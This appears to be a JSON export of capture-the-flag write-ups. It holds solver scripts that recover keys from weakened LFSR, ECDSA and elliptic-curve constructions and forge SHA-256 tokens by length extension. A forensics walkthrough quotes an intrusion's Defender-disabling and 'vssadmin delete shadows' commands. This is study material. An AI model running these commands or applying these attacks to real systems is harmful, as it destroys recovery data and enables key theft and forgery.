(int.from_bytes(xof[i:i + 4], \"big\") & ((1 << n) - 1)) | 1\r\n        if is_primitive(cand, n):\r\n            return cand\r\n    raise RuntimeError(\"no primitive polynomial found\")\r\n\r\n\r\ndef lfsr_clock_state(state, taps, n):\r\n    out = state & 1\r\n    fb = (state & taps).bit_count() & 1\r\n    state = (state >> 1) | (fb << (n - 1))\r\n    return state, out\r\n\r\n\r\ndef bytes_to_bits_msb(data):\r\n    return [(byte >> j) & 1 for byte in data for j in range(7, -1, -1)]\r\n\r\n\r\ndef best_lfsr_phase_by_correlation(taps, n, known_bits):\r\n    \"\"\"Find phase whose m-sequence has strongest correlation with known keystream.\"\"\"\r\n    try:\r\n        import numpy as np\r\n    except ImportError as exc:\r\n        raise SystemExit(\"Need numpy for the fast LFSR correlation step: pip install numpy\") from exc\r\n\r\n    period = (1 << n) - 1\r\n    N = len(known_bits)\r\n\r\n    # Generate one full period plus N-1 bits so every circular window is linear.\r\n    seq = np.empty(period + N - 1, dtype=np.float64)\r\n    state = 1\r\n    for i in range(period + N - 1):\r\n        state, out = lfsr_clock_state(state, taps, n)\r\n        seq[i] = 1.0 if out == 0 else -1.0\r\n\r\n    pattern = np.array([1.0 if b == 0 else -1.0 for b in known_bits[::-1]], dtype=np.float64)\r\n\r\n    conv_len = len(seq) + N - 1\r\n    fft_len = 1 << (conv_len - 1).bit_length()\r\n    corr = np.fft.irfft(np.fft.rfft(seq, fft_len) * np.fft.rfft(pattern, fft_len), fft_len)\r\n    scores = np.rint(corr[N - 1:N - 1 + period]).astype(np.int32)\r\n\r\n    phase = int(scores.argmax())\r\n    score = int(scores[phase])\r\n    matches = (score + N) // 2\r\n    return phase, matches\r\n\r\n\r\ndef state_at_phase(taps, n, phase):\r\n    state = 1\r\n    for _ in range(phase):\r\n        state, _ = lfsr_clock_state(state, taps, n)\r\n    return state\r\n\r\n\r\ndef gen_bits_from_state(taps, n, state, nbits):\r\n    out = []\r\n    for _ in range(nbits):\r\n        state, bit = lfsr_clock_state(state, taps, n)\r\n        out.append(bit)\r\n    return out\r\n\r\n\r\ndef lfsr_output_masks(taps, n, nbits):\r\n    masks = [1 << i for i in range(n)]\r\n    outs = []\r\n    for _ in range(nbits):\r\n        outs.append(masks[0])\r\n        fb = 0\r\n        for i in range(n):\r\n            if (taps >> i) & 1:\r\n                fb ^= masks[i]\r\n        masks = masks[1:] + [fb]\r\n    return outs\r\n\r\n\r\ndef gf2_solve_full_rank(equations, n):\r\n    \"\"\"Solve linear equations over GF(2). equations: (mask, rhs_bit).\"\"\"\r\n    pivots = {}\r\n    for mask, bit in equations:\r\n        row = mask | (bit << n)\r\n        while True:\r\n            coeff = row & ((1 << n) - 1)\r\n            if coeff == 0:\r\n                if (row >> n) & 1:\r\n                    raise RuntimeError(\"inconsistent GF(2) system\")\r\n                break\r\n            p = coeff.bit_length() - 1\r\n            if p in pivots:\r\n                row ^= pivots[p]\r\n            else:\r\n                pivots[p] = row\r\n                break\r\n\r\n    if len(pivots) != n:\r\n        raise RuntimeError(f\"GF(2) rank {len(pivots)} < {n}\")\r\n\r\n    # Reduced row echelon form.\r\n    for p in list(pivots.keys()):\r\n        for q in list(pivots.keys()):\r\n            if p != q and ((pivots[q] >> p) & 1):\r\n                pivots[q] ^= pivots[p]\r\n\r\n    sol = 0\r\n    for p, row in pivots.items():\r\n        coeff = row & ((1 << n) - 1)\r\n        if coeff != (1 << p):\r\n            raise RuntimeError(\"RREF failed\")\r\n        if (row >> n) & 1:\r\n            sol |= 1 << p\r\n    return sol\r\n\r\n\r\ndef recover_lfsr_states(seed, ct):\r\n    taps = [derive_taps(seed, n, label)\r\n            for n, label in zip(LENGTHS, (b\"ALPHA\", b\"BETA\", b\"GAMMA\"))]\r\n\r\n    # Known plaintext prefix gives enough keystream for correlation attacks.\r\n    known_ks = bytes(c ^ p for c, p in zip(ct[:len(HEADER)], HEADER))\r\n    known_bits = bytes_to_bits_msb(known_ks)\r\n\r\n    alpha_phase, alpha_matches = best_lfsr_phase_by_correlation(taps[0], LENGTHS[0], known_bits)\r\n    gamma_phase, gamma_matches = best_lfsr_phase_by_correlation(taps[2], LENGTHS[2], known_bits)\r\n    alpha = state_at_phase(taps[0], LENGTHS[0], alpha_phase)\r\n    gamma = state_at_phase(taps[2], LENGTHS[2], gamma_phase)\r\n\r\n    alpha_bits = gen_bits_from_state(taps[0], LENGTHS[0], alpha, len(known_bits))\r\n    gamma_bits = gen_bits_from_state(taps[2], LENGTHS[2], gamma, len(known_bits))\r\n\r\n    beta_masks = lfsr_output_masks(taps[1], LENGTHS[1], len(known_bits))\r\n    equations = []\r\n    for i, (ks, a, c) in enumerate(zip(known_bits, alpha_bits, gamma_bits)):\r\n        # f = (a&b) ^ (b&c) ^ c = b*(a^c) ^ c\r\n        # If a^c == 1, beta output bit is determined linearly.\r\n        if a ^ c:\r\n            equations.append((beta_masks[i], ks ^ c))\r\n    beta = gf2_solve_full_rank(equations, LENGTHS[1])\r\n\r\n    return taps, (alpha, beta, gamma), (alpha_matches, gamma_matches, len(known_bits))\r\n\r\n\r\ndef seal_three_keystream(taps, states, nbytes):\r\n    regs = [[taps[i], states[i], LENGTHS[i]] for i in range(3)]\r\n    out = bytearray()\r\n    for _ in range(nbytes):\r\n        byte = 0\r\n        for _ in range(8):\r\n            bits = []\r\n            for r in regs:\r\n                r[1], bit = lfsr_clock_state(r[1], r[0], r[2])\r\n                bits.append(bit)\r\n            x1, x2, x3 = bits\r\n            z = (x1 & x2) ^ (x2 & x3) ^ x3\r\n            byte = (byte << 1) | z\r\n        out.append(byte)\r\n    return bytes(out)\r\n\r\n\r\ndef main():\r\n    data = parse_transmission()\r\n\r\n    print(\"[+] Seal I: Franklin-Reiter RSA\")\r\n    capsule = recover_capsule(data[\"n\"], data[\"delta\"], data[\"c1\"], data[\"c2\"])\r\n    if not capsule.startswith(b\"0xV0ID//SEAL-I//\"):\r\n        raise RuntimeError(\"bad capsule magic\")\r\n    prime_p = int.from_bytes(capsule[-16:], \"big\")\r\n    print(f\"    PRIME_P = {prime_p:#x}\")\r\n\r\n    print(\"[+] Seal II: truncated LCG lattice\")\r\n    seed = recover_lcg_seed(prime_p, data[\"a\"], data[\"b\"], data[\"leak\"])\r\n    print(f\"    seed    = {seed:#x}\")\r\n\r\n    print(\"[+] Seal III: LFSR correlation + GF(2) solve\")\r\n    taps, states, info = recover_lfsr_states(seed, data[\"ct\"])\r\n    print(\"    taps    =\", \", \".join(hex(x) for x in taps))\r\n    print(\"    states  =\", \", \".join(hex(x) for x in states))\r\n    print(f\"    corr    = alpha {info[0]}/{info[2]}, gamma {info[1]}/{info[2]} matches\")\r\n\r\n    ks = seal_three_keystream(taps, states, len(data[\"ct\"]))\r\n    pt = bytes(c ^ k for c, k in zip(data[\"ct\"], ks))\r\n    if not (pt.startswith(HEADER) and pt.endswith(FOOTER)):\r\n        raise RuntimeError(\"plaintext structure check failed\")\r\n\r\n    flag = pt[len(HEADER):-len(FOOTER)].decode()\r\n    print(f\"[+] flag = {flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV0ID{W0W_Y0U_4C7U4LLY_F0UND_M3!!}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-crypto-v01dhandout2",
    "title": "V01D Handout 2",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge V01D Handout 2",
    "problemDescription": "Challenge ini berisi client `deadhand2.py` dan transcript `channel.log`. Semua algoritma ada di client, sedangkan material rahasia yang hilang adalah:\n\n- scalar handshake `NODE_D`\n- private key ECDSA `AUTH_X`\n- secret warrant MAC\n- flag broadcast yang dienkripsi dengan token architect\n\nFlag didapat dengan tiga tahap:\n\n1. Kurva handshake ternyata singular, jadi discrete log ECC berubah menjadi discrete log di `F_p^*`.\n2. Dua signature ECDSA memakai nonce yang berbeda tapi terkait: `k2 = k1 + drift(NODE_D)`.\n3. Token `observer` adalah SHA-256 secret-prefix MAC, dan `secret_len` diketahui, jadi token `architect` bisa dibuat dengan length extension.",
    "tools": [],
    "analysis": "`deadhand2.py` punya tiga bagian utama:\n\n- `handshake(scalar)` memakai kurva custom `y^2 = x^3 + A*x + B` di field prime `P`.\n- `sign(msg, x, k)` memakai ECDSA-style signature di secp256k1.\n- `tag(secret, body)` memakai `sha256(secret + body)`.\n\n`channel.log` memberi:\n\n- public point hasil handshake node\n- public key `auth`\n- dua signature `(r1, s1)` dan `(r2, s2)`\n- token `observer`\n- panjang secret warrant, yaitu `33`\n- ciphertext broadcast",
    "solution": [
      {
        "title": "File Challenge",
        "content": "```\ndeadhand2.py   # implementasi client lengkap\nchannel.log    # transcript publik: handshake, signature, observer token, ciphertext\n```"
      },
      {
        "title": "I — The Handshake",
        "content": "Kurva custom dicek dulu:\n\n```\n(4*A^3 + 27*B^2) % P == 0\n```\n\nHasilnya `0`, berarti kurva singular. Polinom kanan kurva punya double root `alpha`, sehingga bentuknya:\n\n```\ny^2 = (x - alpha)^2 (x - beta)\n```\n\nUntuk kurva nodal split, titik kurva bisa dipetakan ke grup multiplikatif `F_p^*`:\n\n```\nphi(x, y) = (y + t*(x-alpha)) / (y - t*(x-alpha)) mod P\n```\n\nDengan:\n\n```\nt^2 = alpha - beta mod P\n```\n\nSetelah generator dan public handshake dipetakan:\n\n```\ng = phi(G)\nh = phi(node)\n```\n\nMaka scalar node cukup dicari dari:\n\n```\nh = g^NODE_D mod P\n```\n\n`P-1` smooth, jadi `sympy.discrete_log()` langsung menyelesaikan discrete log tersebut."
      },
      {
        "title": "II — The Order",
        "content": "Nonce signature kedua tidak reuse langsung, tapi terkait:\n\n```\nk2 = k1 + drift(NODE_D) mod SN\n```\n\nECDSA signature dari client:\n\n```\ns = k^-1 * (digest(msg) + x*r) mod SN\n```\n\nUntuk dua order:\n\n```\ns1*k1           = h1 + x*r1\ns2*(k1 + delta) = h2 + x*r2\n```\n\n`delta = drift(NODE_D)` sudah bisa dihitung setelah tahap handshake. Jadi unknown hanya `k1` dan `x`. Ini sistem linear 2 variabel modulo `SN`, bukan lattice.\n\nFormula yang dipakai solver:\n\n```\ndet = r1*s2 - s1*r2 mod SN\nx = (s1*(h2 - s2*delta) - s2*h1) * det^-1 mod SN\n```\n\nHasil `x` diverifikasi dengan public key `auth` dari transcript."
      },
      {
        "title": "III — The Warrant",
        "content": "Token observer dibuat dengan:\n\n```\nobserver = sha256(secret + WARRANT)\n```\n\nClient juga membocorkan:\n\n```\nsecret_len = 33\n```\n\nTarget token architect dibuat oleh client seperti ini:\n\n```\nsha256(secret + WARRANT + mdpad(len(secret)+len(WARRANT)) + UPGRADE + hex(AUTH_X))\n```\n\nKarena SHA-256 adalah Merkle-Damgard dan state internal sama dengan digest akhir, digest `observer` bisa dipakai sebagai state awal untuk melanjutkan hash. Secret tidak perlu diketahui, cukup panjangnya.\n\nSolver mengimplementasikan SHA-256 compression minimal untuk melanjutkan hash dari state `observer`, lalu membuat token `architect`."
      },
      {
        "title": "Dekripsi Broadcast",
        "content": "Broadcast dienkripsi dengan XOR:\n\n```\nct ^ keystream(architect, len(ct))\n```\n\nSetelah token `architect` berhasil dibuat, ciphertext dibuka dan keluar payload:\n\n```\n[0xV0ID // COMMAND BROADCAST]\nAUTH  : ARCHITECT\nORDER : stand down, the channel is burned\nTOKEN : 0xV0ID{P4r7_2_15_2_C0MPL1C473D_Y4H?}\n[EOT]\n```"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` melakukan semua tahap otomatis:\n\n1. Recover `NODE_D` dari singular curve handshake.\n2. Recover `AUTH_X` dari dua signature ECDSA terkait nonce.\n3. Forge token architect dengan SHA-256 length extension.\n4. Generate ulang keystream.\n5. XOR ciphertext dan print plaintext."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nOutput:\n\n```\n[0xV0ID // COMMAND BROADCAST]\nAUTH  : ARCHITECT\nORDER : stand down, the channel is burned\nTOKEN : 0xV0ID{P4r7_2_15_2_C0MPL1C473D_Y4H?}\n[EOT]\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n# V01D Handout 2 solver\r\n# Python 3 + sympy only.\r\n\r\nimport hashlib\r\nimport struct\r\nfrom sympy.ntheory.residue_ntheory import sqrt_mod, discrete_log\r\n\r\n# ===== Constants copied from deadhand2.py =====\r\nP = 3564625681460390929881227635631045656663925422561280528974142079390139643508987899\r\nA = 1290845814987521891796445286282893750773182431944520388169355126745772946407018553\r\nB = 2548046464103175289844662208531713584748179807189901271913966388343193355335560217\r\nGX = 1457404221189369008358872456999869109718060428281406195376049141321523580448797207\r\nGY = 1290242299127928500851605029070910032280495337570522089014647070915672072669629743\r\n\r\nSP = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f\r\nSA = 0\r\nSGX = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798\r\nSGY = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8\r\nSN = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141\r\n\r\nORDER_A = b\"ORDER-4417//hold position, node V-7 is clean\"\r\nORDER_B = b\"ORDER-4418//burn the channel on my mark\"\r\nWARRANT = b\"node=V-7&role=observer\"\r\nUPGRADE = b\"&role=architect&auth=\"\r\n\r\n# ===== Public transcript copied from channel.log =====\r\nnode_x = 1325638852438642878998123576357249363240549984609651071545386142674754138299496611\r\nnode_y = 468608191669712539538432472947627440322009738671977464971193155685145715350284680\r\n\r\nauth_x = 29327505898692726559383869320329077247000077447589821210313273388338028090524\r\nauth_y = 84810498302385529371929497852548539925227545436477666544442075624496782126268\r\nr1 = 54228046796625044020338114295179004736221704259521266121491731787620273057582\r\ns1 = 49862048638765292299426182791447849596212404258046678658538384601415317794992\r\nr2 = 5228908101607893758353029166591071169661964310161311863919069729013330565745\r\ns2 = 109149138641376889053124178510072847015226335736902590340677224192887875508987\r\n\r\nobserver = bytes.fromhex(\"2db890900d7b55474dc9de0cbae6e8d56fb381c6f6d032689f30738f0f999a12\")\r\nsecret_len = 33\r\nct = bytes.fromhex(\r\n    \"9275c2420846dcaf8953c0bd9a6b0673ac362d265d1bc6e58b5cb8eeee4950f4\"\r\n    \"985bb264bf484b336e19bc429f51dcd033b046ee742e74f0a4396631cd0f2f0\"\r\n    \"dc6f878b0c500284a0864640dc0d61c4d8635096a414f815abfff9959e32b\"\r\n    \"653aece7e6ad7e20bc24e0ab7aaf2d3bf3ac145d1ed485d6012df49746\"\r\n    \"5970a0f8755845c995b9e60f2ecde74a0213\"\r\n)\r\n\r\n\r\ndef ec_add(p1, p2, a, m):\r\n    if p1 is None:\r\n        return p2\r\n    if p2 is None:\r\n        return p1\r\n    if p1[0] == p2[0] and (p1[1] + p2[1]) % m == 0:\r\n        return None\r\n    if p1 == p2:\r\n        lam = (3 * p1[0] * p1[0] + a) * pow(2 * p1[1], -1, m) % m\r\n    else:\r\n        lam = (p2[1] - p1[1]) * pow(p2[0] - p1[0], -1, m) % m\r\n    x = (lam * lam - p1[0] - p2[0]) % m\r\n    y = (lam * (p1[0] - x) - p1[1]) % m\r\n    return x, y\r\n\r\n\r\ndef ec_mul(k, pt, a, m):\r\n    r = None\r\n    while k:\r\n        if k & 1:\r\n            r = ec_add(r, pt, a, m)\r\n        pt = ec_add(pt, pt, a, m)\r\n        k >>= 1\r\n    return r\r\n\r\n\r\ndef digest(msg):\r\n    return int.from_bytes(hashlib.sha256(msg).digest(), \"big\") % SN\r\n\r\n\r\ndef drift(scalar):\r\n    return int.from_bytes(\r\n        hashlib.sha256(b\"DEADHAND/DRIFT/\" + str(scalar).encode()).digest(), \"big\"\r\n    ) % SN\r\n\r\n\r\ndef mdpad(n):\r\n    return b\"\\x80\" + b\"\\x00\" * ((55 - n) % 64) + (n * 8).to_bytes(8, \"big\")\r\n\r\n\r\ndef keystream(key, n):\r\n    out = b\"\"\r\n    i = 0\r\n    while len(out) < n:\r\n        out += hashlib.sha256(key + i.to_bytes(8, \"big\")).digest()\r\n        i += 1\r\n    return out[:n]\r\n\r\n\r\ndef recover_node_scalar():\r\n    # The curve is singular because 4*A^3 + 27*B^2 == 0 mod P.\r\n    assert (4 * pow(A, 3, P) + 27 * pow(B, 2, P)) % P == 0\r\n\r\n    # For y^2 = x^3 + A*x + B with a double root alpha:\r\n    # derivative 3*x^2 + A = 0 and alpha^3 + A*alpha + B = 0.\r\n    # Sympy factoring is overkill; brute over the two square roots of -A/3.\r\n    alpha = None\r\n    for cand in sqrt_mod((-A * pow(3, -1, P)) % P, P, all_roots=True):\r\n        if (pow(cand, 3, P) + A * cand + B) % P == 0:\r\n            alpha = cand\r\n            break\r\n    if alpha is None:\r\n        raise RuntimeError(\"double root not found\")\r\n\r\n    beta = (-2 * alpha) % P\r\n    tangent = sqrt_mod((alpha - beta) % P, P, all_roots=True)[0]\r\n\r\n    def phi(pt):\r\n        x, y = pt\r\n        dx = (x - alpha) % P\r\n        # Nodal singular curve is isomorphic to F_p^*:\r\n        # phi(P) = (y + t*(x-alpha)) / (y - t*(x-alpha)).\r\n        return ((y + tangent * dx) * pow((y - tangent * dx) % P, -1, P)) % P\r\n\r\n    g = phi((GX, GY))\r\n    h = phi((node_x, node_y))\r\n    d = int(discrete_log(P, h, g))\r\n\r\n    # Sanity check against the original add/mul implementation.\r\n    assert ec_mul(d, (GX, GY), A, P) == (node_x, node_y)\r\n    return d\r\n\r\n\r\ndef recover_auth_private(node_d):\r\n    delta = drift(node_d)\r\n    h1 = digest(ORDER_A)\r\n    h2 = digest(ORDER_B)\r\n\r\n    # ECDSA equations:\r\n    #   s1*k       = h1 + x*r1\r\n    #   s2*(k+dlt) = h2 + x*r2\r\n    # Unknowns are k and private key x. Solve the 2x2 linear system mod SN.\r\n    det = (r1 * s2 - s1 * r2) % SN\r\n    x = ((s1 * (h2 - s2 * delta) - s2 * h1) * pow(det, -1, SN)) % SN\r\n    k = ((h1 * (-r2) - (h2 - s2 * delta) * (-r1)) * pow(det, -1, SN)) % SN\r\n\r\n    assert ec_mul(x, (SGX, SGY), SA, SP) == (auth_x, auth_y)\r\n    assert ec_mul(k, (SGX, SGY), SA, SP)[0] % SN == r1\r\n    assert ec_mul((k + delta) % SN, (SGX, SGY), SA, SP)[0] % SN == r2\r\n    return x\r\n\r\n\r\n# Minimal SHA-256 continuation implementation for length extension.\r\nK256 = [\r\n    0x428A2F98, 0x71374491, 0xB5C0FBCF, 0xE9B5DBA5, 0x3956C25B, 0x59F111F1, 0x923F82A4, 0xAB1C5ED5,\r\n    0xD807AA98, 0x12835B01, 0x243185BE, 0x550C7DC3, 0x72BE5D74, 0x80DEB1FE, 0x9BDC06A7, 0xC19BF174,\r\n    0xE49B69C1, 0xEFBE4786, 0x0FC19DC6, 0x240CA1CC, 0x2DE92C6F, 0x4A7484AA, 0x5CB0A9DC, 0x76F988DA,\r\n    0x983E5152, 0xA831C66D, 0xB00327C8, 0xBF597FC7, 0xC6E00BF3, 0xD5A79147, 0x06CA6351, 0x14292967,\r\n    0x27B70A85, 0x2E1B2138, 0x4D2C6DFC, 0x53380D13, 0x650A7354, 0x766A0ABB, 0x81C2C92E, 0x92722C85,\r\n    0xA2BFE8A1, 0xA81A664B, 0xC24B8B70, 0xC76C51A3, 0xD192E819, 0xD6990624, 0xF40E3585, 0x106AA070,\r\n    0x19A4C116, 0x1E376C08, 0x2748774C, 0x34B0BCB5, 0x391C0CB3, 0x4ED8AA4A, 0x5B9CCA4F, 0x682E6FF3,\r\n    0x748F82EE, 0x78A5636F, 0x84C87814, 0x8CC70208, 0x90BEFFFA, 0xA4506CEB, 0xBEF9A3F7, 0xC67178F2,\r\n]\r\n\r\n\r\ndef rotr(x, n):\r\n    return ((x >> n) | (x << (32 - n))) & 0xFFFFFFFF\r\n\r\n\r\ndef sha256_compress(chunk, h):\r\n    w = list(struct.unpack(\">16I\", chunk)) + [0] * 48\r\n    for i in range(16, 64):\r\n        s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >> 3)\r\n        s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >> 10)\r\n        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) & 0xFFFFFFFF\r\n\r\n    a, b, c, d, e, f, g, hh = h\r\n    for i in range(64):\r\n        S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)\r\n        ch = (e & f) ^ ((~e) & g)\r\n        t1 = (hh + S1 + ch + K256[i] + w[i]) & 0xFFFFFFFF\r\n        S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)\r\n        maj = (a & b) ^ (a & c) ^ (b & c)\r\n        t2 = (S0 + maj) & 0xFFFFFFFF\r\n        hh, g, f, e, d, c, b, a = g, f, e, (d + t1) & 0xFFFFFFFF, c, b, a, (t1 + t2) & 0xFFFFFFFF\r\n\r\n    return [(old + new) & 0xFFFFFFFF for old, new in zip(h, [a, b, c, d, e, f, g, hh])]\r\n\r\n\r\ndef sha256_length_extend(known_digest, append, processed_len):\r\n    h = list(struct.unpack(\">8I\", known_digest))\r\n    total_len = processed_len + len(append)\r\n    forged_tail = append + b\"\\x80\" + b\"\\x00\" * ((55 - total_len) % 64) + (total_len * 8).to_bytes(8, \"big\")\r\n    assert len(forged_tail) % 64 == 0\r\n\r\n    for i in range(0, len(forged_tail), 64):\r\n        h = sha256_compress(forged_tail[i:i + 64], h)\r\n    return b\"\".join(v.to_bytes(4, \"big\") for v in h)\r\n\r\n\r\ndef forge_architect_token(auth_private):\r\n    # observer = SHA256(secret || WARRANT), len(secret)=33.\r\n    # Continue from that internal state over UPGRADE || hex(auth_private).\r\n    original_len = secret_len + len(WARRANT)\r\n    processed_len = original_len + len(mdpad(original_len))\r\n    append = UPGRADE + format(auth_private, \"x\").encode()\r\n    return sha256_length_extend(observer, append, processed_len)\r\n\r\n\r\ndef main():\r\n    node_d = recover_node_scalar()\r\n    auth_private = recover_auth_private(node_d)\r\n    architect = forge_architect_token(auth_private)\r\n\r\n    pt = bytes(a ^ b for a, b in zip(ct, keystream(architect, len(ct))))\r\n    print(pt.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV0ID{P4r7_2_15_2_C0MPL1C473D_Y4H?}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-foren-blackout",
    "title": "BlackOut — Full Walkthrough",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge BlackOut — Full Walkthrough",
    "problemDescription": "Challenge BlackOut berisi artefak insiden forensik: endpoint logs, network logs, memory strings, encrypted loader configuration, dan relay payload terenkripsi. Tujuannya bukan hanya mencari satu flag, tapi menyusun rantai intrusi dari awal sampai payload relay terakhir.\n\nDari lima pertanyaan stage, hasil akhirnya:\n\n| No. | Pertanyaan | Jawaban |\n|---|---|---|\n| 1 | Compromised user, workstation, first payload | `0xV01D{nova0x_NOVA-FIN-044_invoice_0814.lnk}` |\n| 2 | Defense evasion command dan recovery removal command | `0xV01D{Set-MpPreference_vssadmin_delete_shadows}` |\n| 3 | Campaign value hidden in DNS TXT records | `0xV01D{void-ops_august-red}` |\n| 4 | Loader config family dan C2 endpoint | `0xV01D{oxide_loader_198.51.100.42_8080}` |\n| 5 | Final relay objective dan session | `0xV01D{blackout_key_recovered_from_memory_and_relay_stream_7f4d9b2c}` |\n\nAlur besarnya:\n\n1. Endpoint logs menunjukkan user `nova0x` di host `NOVA-FIN-044` menjalankan payload awal `invoice_0814.lnk`.\n2. Log proses menunjukkan operator mematikan proteksi Defender dan menghapus shadow copies.\n3. DNS TXT fragments berisi potongan Base64 yang jika disusun membentuk campaign value.\n4. Campaign value + device + session dipakai untuk derive key dan decrypt loader config `oxide_loader.config.enc`.\n5. Key config dipakai lagi untuk derive final relay key, lalu decrypt relay payload untuk mendapatkan objective final.",
    "tools": [
      "Tools lokal yang cukup:",
      "```bash",
      "unzip blackout.zip",
      "find . -type f",
      "strings -a evidence/Memory/NOVA-FIN-044_strings.bin",
      "python3 solve_blackout.py",
      "`",
      "Library Python yang dipakai solver:",
      "`",
      "base64",
      "re",
      "json",
      "gzip",
      "hmac",
      "hashlib",
      "cryptography",
      "`"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "File Challenge",
        "content": "Struktur artefak utama:\n\n```\nBlackOut/\n├── CASE_BRIEF.txt\n├── STAGE_PROMPTS.txt\n├── evidence/\n│   ├── Endpoint/\n│   │   ├── Security/\n│   │   │   └── Security_4688.csv\n│   │   ├── PowerShell/\n│   │   └── Sysmon/\n│   │       └── Microsoft-Windows-Sysmon_Operational.evtx.xml\n│   ├── Malware/\n│   │   └── oxide_loader.config.enc\n│   ├── Memory/\n│   │   └── NOVA-FIN-044_strings.bin\n│   └── Network/\n│       ├── Zeek/\n│       │   ├── conn.log.csv\n│       │   ├── dns.log.csv\n│       │   └── http.log.csv\n│       └── relay_stream_8080.bin\n```\n\nFile yang paling penting:\n\n- `CASE_BRIEF.txt`: konteks host dan user.\n- `Security_4688.csv`: process creation Windows Event ID 4688.\n- `Microsoft-Windows-Sysmon_Operational.evtx.xml`: detail process execution, parent-child process, command line.\n- `dns.log.csv`: DNS TXT fragments.\n- `NOVA-FIN-044_strings.bin`: memory fragments berisi session, device, nonce, dan hint derivasi key.\n- `oxide_loader.config.enc`: encrypted loader configuration.\n- `relay_stream_8080.bin`: relay payload terenkripsi di dalam WebSocket + gzip."
      },
      {
        "title": "Stage 1 — Compromised User, Workstation, dan First Payload",
        "content": "### Tujuan\n\nPertanyaan:\n\n```\nFind the compromised user, workstation, and first payload.\nSubmit format: 0xV01D{user_host_payload}\n```\n\n### Analisis\n\nDari brief dan endpoint logs, workstation korban adalah:\n\n```\nNOVA-FIN-044\n```\n\nUser yang muncul pada workstation tersebut:\n\n```\nTHRYVE\\nova0x\n```\n\nUntuk format flag, domain `THRYVE\\` tidak dipakai, jadi user-nya:\n\n```\nnova0x\n```\n\nPayload awal terlihat dari path Downloads:\n\n```\nC:\\Users\\nova0x\\Downloads\\invoice_0814.lnk\n```\n\nLog proses menunjukkan payload ini dijalankan melalui LOLBin `mshta.exe`:\n\n```\nmshta.exe \"C:\\Users\\nova0x\\Downloads\\invoice_0814.lnk\"\n```\n\nRelay final juga menguatkan bahwa initial payload chain adalah:\n\n```\ninvoice_0814.lnk -> signed_update.hta\n```\n\nKarena yang diminta adalah first payload, yang dipakai adalah file pertama dalam chain:\n\n```\ninvoice_0814.lnk\n```\n\n### Flag Stage 1\n\n```\n0xV01D{nova0x_NOVA-FIN-044_invoice_0814.lnk}\n```"
      },
      {
        "title": "Stage 2 — Defense Evasion Command dan Recovery Removal Command",
        "content": "### Tujuan\n\nPertanyaan:\n\n```\nIdentify the defense evasion command and the recovery removal command.\nSubmit format: 0xV01D{defender_command_shadow_command}\n```\n\n### Analisis\n\nAda dua command penting di endpoint logs.\n\nCommand pertama mematikan proteksi Defender:\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true\n```\n\nCommand kedua menghapus recovery/shadow copies:\n\n```\nvssadmin delete shadows /all /quiet\n```\n\nUntuk format submit, challenge tidak meminta full argument string, tapi nama command utama dan aksi shadow command.\n\nJadi token yang dipakai:\n\n```\nSet-MpPreference\nvssadmin_delete_shadows\n```\n\n### Flag Stage 2\n\n```\n0xV01D{Set-MpPreference_vssadmin_delete_shadows}\n```"
      },
      {
        "title": "Stage 3 — Campaign Value dari DNS TXT Records",
        "content": "### Tujuan\n\nPertanyaan:\n\n```\nRecover the campaign value hidden in DNS TXT records.\nSubmit format: 0xV01D{campaign_value}\n```\n\n### Analisis\n\nDi `dns.log.csv`, ditemukan query TXT ke subdomain `voidcdn.net` dengan index fragment:\n\n```\n_0.k984.voidcdn.net\n_1.k984.voidcdn.net\n_2.k984.voidcdn.net\n```\n\nMasing-masing TXT record menyimpan potongan Base64:\n\n```\n_0 -> dm9pZC1vcHMv\n_1 -> YXVndXN0LXJl\n_2 -> ZA==\n```\n\nDecode Base64:\n\n```\ndm9pZC1vcHMv -> void-ops/\nYXVndXN0LXJl -> august-re\nZA==         -> d\n```\n\nJika digabung:\n\n```\nvoid-ops/august-red\n```\n\nNamun format flag memakai underscore sebagai separator. Slash `/` dinormalisasi menjadi `_`, sementara hyphen `-` tetap dipertahankan.\n\n```\nvoid-ops/august-red -> void-ops_august-red\n```\n\n### Script Decode Singkat\n\n```python\nimport base64\n\nparts = [\n    \"dm9pZC1vcHMv\",\n    \"YXVndXN0LXJl\",\n    \"ZA==\",\n]\n\ncampaign = b\"\".join(base64.b64decode(x) for x in parts).decode()\nprint(campaign)\nprint(campaign.replace(\"/\", \"_\"))\n```\n\nOutput:\n\n```\nvoid-ops/august-red\nvoid-ops_august-red\n```\n\n### Flag Stage 3\n\n```\n0xV01D{void-ops_august-red}\n```"
      },
      {
        "title": "Stage 4 — Decrypt Loader Configuration, Family, dan C2 Endpoint",
